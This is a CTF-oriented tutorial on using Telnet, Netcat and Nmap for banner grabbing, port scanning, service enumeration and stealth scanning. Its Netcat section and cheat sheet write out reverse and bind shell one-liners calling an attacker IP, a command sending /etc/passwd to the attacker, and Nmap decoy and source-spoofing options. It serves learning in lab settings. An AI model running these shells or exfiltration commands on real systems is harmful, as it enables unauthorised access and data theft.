 # CTF Network Reconnaissance & Exploitation Guide

A comprehensive guide to the three essential tools for CTF network challenges: **Telnet**, **Netcat (nc)**, and **Nmap**.

---

## 1. Telnet — The Protocol Analyzer

Telnet is a legacy protocol, but in CTFs it's invaluable for **banner grabbing** and **interacting with services** that expect plain-text communication.

### Basic Usage

```bash
# Connect to a service
telnet <target> <port>

# Example: Check an FTP server
telnet 10.10.10.10 21

# Common CTF ports to check
telnet target 80    # HTTP
telnet target 110   # POP3
telnet target 25    # SMTP
telnet target 3306  # MySQL (sometimes responds)
```

### CTF Techniques

**Banner Grabbing** — Services often leak version info:
```bash
$ telnet 192.168.1.10 22
Trying 192.168.1.10...
Connected to 192.168.1.10.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```

**Manual HTTP Requests**:
```bash
$ telnet target 80
Trying target...
Connected to target.
Escape character is '^]'.

# Type this manually:
GET / HTTP/1.1
Host: target
[Press Enter twice]

# Response shows headers, server type, etc.
```

**SMTP Interaction** (for email-based challenges):
```bash
telnet target 25
HELO ctfplayer
MAIL FROM:<test@local>
RCPT TO:<admin@target>
DATA
Subject: Test
This is a test.
.
QUIT
```

### Telnet Escape Character
- Press `Ctrl+]` to get the `telnet>` prompt
- Type `quit` to exit cleanly
- Type `close` to close connection but stay in telnet

---

## 2. Netcat (nc) — The Swiss Army Knife

Netcat is the most versatile networking tool in CTFs. It can read/write data across networks using TCP or UDP.

### Basic Connectivity

```bash
# Connect to a service (like telnet but better)
nc -v <target> <port>

# Example with verbose output
nc -v 10.10.10.10 1337

# Connect with timeout
nc -v -w 3 10.10.10.10 80

# UDP connection
nc -u -v target 53
```

### Port Scanning (Quick & Dirty)

```bash
# Scan a range of ports
nc -zv target 1-1000

# Scan specific ports
nc -zv target 20,21,22,23,25,53,80,110,143,443,445,3306,8080

# -z: zero I/O mode (scanning only)
# -v: verbose
```

### Banner Grabbing

```bash
# Send nothing, just grab the banner
echo "" | nc -v target 22

# Or interact manually
nc target 80
# Then type your request
```

### File Transfer

**Sender (Victim/Server)**:
```bash
nc -l -p 4444 < file_to_send.txt
# Or on modern nc:
nc -lvnp 4444 < secret_flag.txt
```

**Receiver (Your machine)**:
```bash
nc target_ip 4444 > received_file.txt
```

**Reverse: Send file TO target**:
```bash
# Your machine (listener)
nc -lvnp 4444 > received_file

# Target (sending)
nc your_ip 4444 < /etc/passwd
```

### Reverse Shells & Bind Shells

**Reverse Shell** (Target connects back to you):
```bash
# Your machine (listener)
nc -lvnp 4444

# Target (sends shell to you)
nc -e /bin/sh your_ip 4444        # Linux
nc -e cmd.exe your_ip 4444        # Windows

# If -e is not available (OpenBSD nc), use:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc your_ip 4444 > /tmp/f
```

**Bind Shell** (Target listens, you connect):
```bash
# Target (listens for connection)
nc -lvnp 4444 -e /bin/bash

# Your machine (connect to target)
nc target_ip 4444
```

### Netcat as a Simple Server

```bash
# HTTP server (serves a file)
{ echo -ne "HTTP/1.1 200 OK\r\n\r\n"; cat index.html; } | nc -l -p 8080

# Or use while loop for multiple connections
while true; do nc -l -p 8080 -q 1 < response.txt; done
```

### Netcat Variants

| Variant | Features |
|---------|----------|
| `nc` (traditional) | `-e` for executing programs |
| `ncat` (Nmap) | SSL support, better security |
| `nc.openbsd` | No `-e`, more secure |
| `pwncat` | CTF-optimized, auto-stabilizes shells |

**Using ncat for encrypted connections**:
```bash
ncat --ssl target 443
ncat --ssl -lvp 4444  # SSL listener
```

---

## 3. Nmap — The Network Mapper

Nmap is the gold standard for network discovery and security auditing.

### Basic Scans

```bash
# Quick scan of top 1000 ports
nmap target

# Scan all ports (comprehensive but slow)
nmap -p- target

# Scan specific ports
nmap -p 22,80,443,8080 target

# Scan port ranges
nmap -p 1-65535 target

# Fast scan (top 100 ports only)
nmap -F target
```

### Host Discovery

```bash
# Ping sweep (find live hosts)
nmap -sn 192.168.1.0/24

# ARP scan (local network, more accurate)
nmap -sn -PR 192.168.1.0/24

# No ping (scan hosts that don't respond to ping)
nmap -Pn target
```

### Service & Version Detection

```bash
# Detect versions (-sV)
nmap -sV target

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A target

# Intensity level 9 (most aggressive version detection)
nmap -sV --version-intensity 9 target
```

### OS Detection

```bash
# Operating system detection
nmap -O target

# Limit OS scan to promising targets
nmap -O --osscan-limit target
```

### Script Scanning (NSE — Nmap Scripting Engine)

```bash
# Default scripts
nmap -sC target

# Specific script category
nmap --script=vuln target           # Vulnerability scans
nmap --script=safe target           # Safe scripts only
nmap --script=exploit target        # Exploit scripts

# Specific script
nmap --script=http-enum target
nmap --script=ftp-anon target
nmap --script=smb-os-discovery target

# Multiple scripts
nmap --script="http-*" target       # All HTTP scripts

# Script arguments
nmap --script ssh-audit --script-args "ssh-audit.timeout=30s" target
```

**Essential NSE Scripts for CTFs**:
| Script | Purpose |
|--------|---------|
| `http-enum` | Enumerate web directories |
| `ftp-anon` | Check for anonymous FTP |
| `smb-enum-shares` | List SMB shares |
| `smb-os-discovery` | Windows OS info |
| `dns-zone-transfer` | Attempt AXFR |
| `mysql-empty-password` | Check for empty MySQL password |
| `ssh-audit` | SSH configuration audit |
| `ssl-heartbleed` | Test for Heartbleed |
| `vulners` | Query Vulners database |

### Scan Timing & Performance

```bash
# Timing templates (T0-T5)
nmap -T4 target        # Aggressive (faster)
nmap -T5 target        # Insane (fastest, may miss things)
nmap -T2 target        # Polite (slower, stealthier)

# Parallelism
nmap --min-parallelism 100 target
nmap --max-retries 1 target
```

### Stealth Scans

```bash
# SYN scan (half-open, requires root)
sudo nmap -sS target

# FIN/Null/Xmas scans (bypass some firewalls)
sudo nmap -sF target    # FIN scan
sudo nmap -sN target    # Null scan
sudo nmap -sX target    # Xmas scan

# Decoy scan (hide your IP)
sudo nmap -D RND:10 target    # 10 random decoys
sudo nmap -D 1.2.3.4,5.6.7.8,ME target

# Fragment packets
sudo nmap -f target

# Spoof source address
sudo nmap -S 1.2.3.4 -e eth0 target
```

### Output Formats

```bash
# Normal output
nmap -oN scan.txt target

# XML output (great for parsing)
nmap -oX scan.xml target

# Greppable output
nmap -oG scan.gnmap target

# All formats
nmap -oA scan target    # Creates scan.nmap, scan.xml, scan.gnmap
```

### UDP Scanning

```bash
# UDP scan (slow but important)
sudo nmap -sU target

# Top 20 UDP ports
sudo nmap -sU --top-ports 20 target

# Combine with TCP
sudo nmap -sS -sU target
```

---

## 4. CTF Workflow: Putting It All Together

### Phase 1: Host Discovery
```bash
# Find live hosts
nmap -sn 10.10.10.0/24

# Or if ping is blocked
nmap -Pn -p 22,80,443 10.10.10.0/24
```

### Phase 2: Port Scanning
```bash
# Quick all-port scan
nmap -p- --min-rate 1000 -T4 10.10.10.10

# Detailed scan on found ports
nmap -p 22,80,3306,8080 -sV -sC -O 10.10.10.10
```

### Phase 3: Service Enumeration
```bash
# Web service
nmap --script=http-enum,http-title,http-methods -p 80,8080 10.10.10.10

# SMB
nmap --script=smb-enum-shares,smb-enum-users -p 445 10.10.10.10

# FTP
nmap --script=ftp-anon,ftp-bounce -p 21 10.10.10.10
```

### Phase 4: Manual Interaction
```bash
# Grab banners
nc -v 10.10.10.10 80
telnet 10.10.10.10 22

# Interact with custom service
nc 10.10.10.10 1337
# Or use pwncat for better shell handling
pwncat-cs 10.10.10.10:4444
```

---

## 5. Quick Reference Cheat Sheet

| Task | Command |
|------|---------|
| Quick port scan | `nmap -T4 target` |
| All ports | `nmap -p- target` |
| Service versions | `nmap -sV target` |
| Full aggressive | `nmap -A target` |
| UDP scan | `sudo nmap -sU target` |
| Connect to service | `nc -v target port` |
| Listen for connection | `nc -lvnp 4444` |
| Reverse shell (listener) | `nc -lvnp 4444` |
| Reverse shell (target) | `nc -e /bin/sh attacker_ip 4444` |
| Banner grab | `echo "" \| nc -v target port` |
| File transfer (receive) | `nc -lvnp 4444 > file` |
| File transfer (send) | `nc target 4444 < file` |
| Quick HTTP check | `telnet target 80` |
| SMTP interaction | `telnet target 25` |

---

## Pro Tips

1. **Always scan all ports** (`-p-`) — CTFs love non-standard ports
2. **Use `-sC` (default scripts)** — They catch common misconfigurations automatically
3. **Save your scans** (`-oA`) — You'll reference them repeatedly
4. **Use `pwncat-cs` instead of raw nc** for shells — It auto-stabilizes and provides a better experience
5. **Check UDP** — SNMP (161), DNS (53), and TFTP (69) are common in CTFs
6. **Read error messages** — CTF services often leak hints in error banners
7. **Pipe data** — `echo "command" | nc target port` is faster than interactive mode for simple interactions
